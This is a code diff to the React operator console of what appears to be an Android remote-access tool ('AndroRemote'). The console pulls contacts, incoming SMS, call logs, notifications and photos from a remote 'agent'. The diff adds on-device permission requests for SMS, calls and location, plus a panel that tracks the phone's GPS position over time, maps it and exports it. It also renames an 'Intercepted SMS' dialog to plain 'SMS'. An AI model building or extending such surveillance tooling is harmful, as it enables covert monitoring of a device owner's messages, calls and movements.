@@ -1,12 +1,14 @@
 import { useCallback, useState } from "react";
 import { toast } from "sonner";
 import {
-  Copy, Download, ExternalLink, MessageSquareText, MoreHorizontal, PhoneCall, RefreshCw, Search, Send, SquareArrowOutUpRight,
+  Copy, Download, ExternalLink, MapPin, MessageSquareText, MoreHorizontal, PhoneCall, RefreshCw, Search, Send, SquareArrowOutUpRight,
 } from "lucide-react";
 import { downloadFile, postOp } from "@/lib/api";
 import { useConsole } from "@/state";
+import { DataTable, type Column } from "@/components/data-table";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import {
   Dialog, DialogContent, DialogFooter, DialogHeader, DialogTitle,
 } from "@/components/ui/dialog";
@@ -16,13 +18,29 @@ import {
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs";
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Textarea } from "@/components/ui/textarea";
-import { DataTable, type Column } from "@/components/data-table";
+import { PermButton } from "@/components/perm-button";
 
 type Row = Record<string, any>;
 
 const ROW_ARGS: Record<string, Record<string, unknown>> = {
   contacts: { n: 200 }, smsin: { n: 50 }, calllog: { n: 50 }, notifs: { n: 50 }, photos: { n: 50 },
+};
+
+/** Runtime permissions each tab needs — requested on-device via PERMREQ. */
+const TAB_PERMS: Record<string, string[]> = {
+  log: ["android.permission.READ_SMS", "android.permission.RECEIVE_SMS", "android.permission.SEND_SMS"],
+  smsin: ["android.permission.READ_SMS", "android.permission.RECEIVE_SMS", "android.permission.SEND_SMS"],
+  contacts: ["android.permission.READ_CONTACTS"],
+  calllog: ["android.permission.READ_CALL_LOG", "android.permission.READ_PHONE_STATE", "android.permission.CALL_PHONE"],
+  notifs: ["android.permission.POST_NOTIFICATIONS"],
+  photos: ["android.permission.READ_MEDIA_IMAGES"],
+  loc: ["android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_COARSE_LOCATION"],
+};
+/** Tabs that additionally need a special-access settings screen (UIREQ). */
+const TAB_UI: Record<string, { what: string; label: string }> = {
+  notifs: { what: "notiflistener", label: "Listener settings" },
 };
 
 async function copyText(t: string, label = "copied") {
@@ -135,6 +153,9 @@ export default function DataView() {
         </>);
       case "smsin":
         return (r) => menu(<>
+          <DropdownMenuItem className={itemCls} onClick={() => setRecord({ time: r.date, from: r.from, body: r.body, file: "" })}>
+            <ExternalLink /> View message
+          </DropdownMenuItem>
           <DropdownMenuItem className={itemCls} onClick={() => smsTo(r.from)}>
             <MessageSquareText /> Reply by SMS
           </DropdownMenuItem>
@@ -275,6 +296,8 @@ export default function DataView() {
         <Button size="sm" variant="secondary" disabled={busy} onClick={() => fetchTab(tab, true)}>
           <RefreshCw className={"size-3.5 mr-1" + (busy ? " animate-spin" : "")} /> Fetch
         </Button>
+        {TAB_PERMS[tab] && <PermButton perms={TAB_PERMS[tab]} label="Grant permissions" />}
+        {TAB_UI[tab] && <PermButton what={TAB_UI[tab].what} label={TAB_UI[tab].label} />}
         {kind === "rows" && (
           <div className="relative">
             <Search className="size-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
@@ -293,7 +316,10 @@ export default function DataView() {
           <p className="text-xs font-mono mt-1 opacity-70">check that the agent is online, then fetch again</p>
         </div>
       ) : kind === "text" ? (
-        <TextOut id={tab} text={entry.payload.text || "(empty)"} />
+        <>
+          <TextOut id={tab} text={entry.payload.text || "(empty)"} />
+          {tab === "loc" && <LocTrackPanel />}
+        </>
       ) : kind === "info" ? (
         <InfoCard f={entry.payload.info} />
       ) : (
@@ -338,10 +364,10 @@ export default function DataView() {
       <Dialog open={!!record} onOpenChange={(o) => !o && setRecord(null)}>
         <DialogContent className="sm:max-w-lg">
           <DialogHeader>
-            <DialogTitle className="font-mono text-sm">Intercepted SMS · {record?.from}</DialogTitle>
+            <DialogTitle className="font-mono text-sm">SMS · {record?.from}</DialogTitle>
           </DialogHeader>
           <div className="space-y-2 text-xs font-mono">
-            <p className="text-muted-foreground">{record?.time} · {record?.file}</p>
+            <p className="text-muted-foreground">{record?.time}{record?.file ? ` · ${record.file}` : ""}</p>
             <div className="rounded-md border bg-muted/40 p-3 whitespace-pre-wrap break-words text-sm leading-relaxed">
               {record?.body || "(empty)"}
             </div>
@@ -428,5 +454,124 @@ function InfoCard({ f }: { f: Record<string, string> | null }) {
         </div>
       ))}
     </div>
+  );
+}
+
+type TrackPoint = { lat: string; lng: string; acc: number; time: string; prov: string };
+
+/** Location tracking over a time window (LOCTRACK): duration + interval
+ * controls, fixes table, GPX export and an OSM preview of the whole track. */
+function LocTrackPanel() {
+  const { snapshot } = useConsole();
+  const cid = snapshot?.active ?? null;
+  const [secs, setSecs] = useState(60);
+  const [ivl, setIvl] = useState(10);
+  const [busy, setBusy] = useState(false);
+  const [pts, setPts] = useState<TrackPoint[] | null>(null);
+  const [err, setErr] = useState<string | null>(null);
+
+  if (!cid) return null;
+
+  const track = async () => {
+    setBusy(true); setErr(null);
+    try {
+      const r = await postOp<{ rows?: TrackPoint[]; error?: string }>("loctrack", { secs, interval: ivl });
+      if (r.error) setErr(r.error);
+      else setPts(r.rows ?? []);
+    } catch (e) { setErr(String(e instanceof Error ? e.message : e)); }
+    setBusy(false);
+  };
+
+  const downloadGpx = () => {
+    if (!pts?.length) return;
+    const trkpts = pts.map((p) => `      <trkpt lat="${p.lat}" lon="${p.lng}"/>`).join("\n");
+    const gpx = `<?xml version="1.0" encoding="UTF-8"?>\n<gpx version="1.1" creator="AndroRemote">\n  <trk>\n    <name>track ${new Date().toISOString().slice(0, 19)}</name>\n    <trkseg>\n${trkpts}\n    </trkseg>\n  </trk>\n</gpx>\n`;
+    const url = URL.createObjectURL(new Blob([gpx], { type: "application/gpx+xml" }));
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `track_${new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-")}.gpx`;
+    a.click();
+    URL.revokeObjectURL(url);
+  };
+
+  let map: string | null = null;
+  if (pts?.length) {
+    const lats = pts.map((p) => Number(p.lat));
+    const lngs = pts.map((p) => Number(p.lng));
+    const padLat = Math.max((Math.max(...lats) - Math.min(...lats)) * 0.15, 0.002);
+    const padLng = Math.max((Math.max(...lngs) - Math.min(...lngs)) * 0.15, 0.002);
+    const last = pts[pts.length - 1];
+    map = `https://www.openstreetmap.org/export/embed.html?bbox=${Math.min(...lngs) - padLng},${Math.min(...lats) - padLat},${Math.max(...lngs) + padLng},${Math.max(...lats) + padLat}&layer=mapnik&marker=${last.lat},${last.lng}`;
+  }
+
+  return (
+    <Card>
+      <CardHeader className="pb-2">
+        <CardTitle className="font-mono text-[11px] uppercase tracking-widest text-muted-foreground">Track location</CardTitle>
+      </CardHeader>
+      <CardContent className="space-y-3">
+        <div className="flex items-center gap-2 flex-wrap">
+          <Select value={String(secs)} onValueChange={(v) => setSecs(Number(v))}>
+            <SelectTrigger size="sm" className="w-24 font-mono text-xs"><SelectValue /></SelectTrigger>
+            <SelectContent>
+              <SelectItem value="60">1 min</SelectItem>
+              <SelectItem value="300">5 min</SelectItem>
+              <SelectItem value="600">10 min</SelectItem>
+            </SelectContent>
+          </Select>
+          <Select value={String(ivl)} onValueChange={(v) => setIvl(Number(v))}>
+            <SelectTrigger size="sm" className="w-24 font-mono text-xs"><SelectValue /></SelectTrigger>
+            <SelectContent>
+              <SelectItem value="5">5s fix</SelectItem>
+              <SelectItem value="10">10s fix</SelectItem>
+              <SelectItem value="30">30s fix</SelectItem>
+            </SelectContent>
+          </Select>
+          <Button size="sm" disabled={busy} onClick={track}>
+            <MapPin className="size-3.5 mr-1" /> {busy ? "Tracking…" : "Track"}
+          </Button>
+          {!!pts?.length && (
+            <Button size="sm" variant="outline" onClick={downloadGpx}>
+              <Download className="size-3.5 mr-1" /> GPX ({pts.length})
+            </Button>
+          )}
+        </div>
+        {busy && <p className="text-[11px] text-muted-foreground font-mono">collecting fixes on the device — panel updates when the window closes</p>}
+        {err && <p className="text-xs font-mono text-red-500/90">{err}</p>}
+        {!!pts?.length && (
+          <>
+            <div className="max-h-56 overflow-auto rounded-md border">
+              <table className="w-full font-mono text-xs">
+                <thead className="sticky top-0 bg-muted/60">
+                  <tr className="text-left text-muted-foreground">
+                    <th className="px-2 py-1.5">time</th>
+                    <th className="px-2 py-1.5">lat</th>
+                    <th className="px-2 py-1.5">lng</th>
+                    <th className="px-2 py-1.5 text-right">±m</th>
+                    <th className="px-2 py-1.5">prov</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {pts.map((p, i) => (
+                    <tr key={i} className="border-t">
+                      <td className="px-2 py-1 text-muted-foreground">{p.time}</td>
+                      <td className="px-2 py-1">{p.lat}</td>
+                      <td className="px-2 py-1">{p.lng}</td>
+                      <td className="px-2 py-1 text-right text-muted-foreground">{p.acc}</td>
+                      <td className="px-2 py-1 text-muted-foreground">{p.prov}</td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            </div>
+            {map && (
+              <div className="w-full h-64 rounded-md overflow-hidden border">
+                <iframe title="track map" width="100%" height="100%" frameBorder="0" scrolling="no" src={map} style={{ border: 0 }} />
+              </div>
+            )}
+          </>
+        )}
+      </CardContent>
+    </Card>
   );
 }
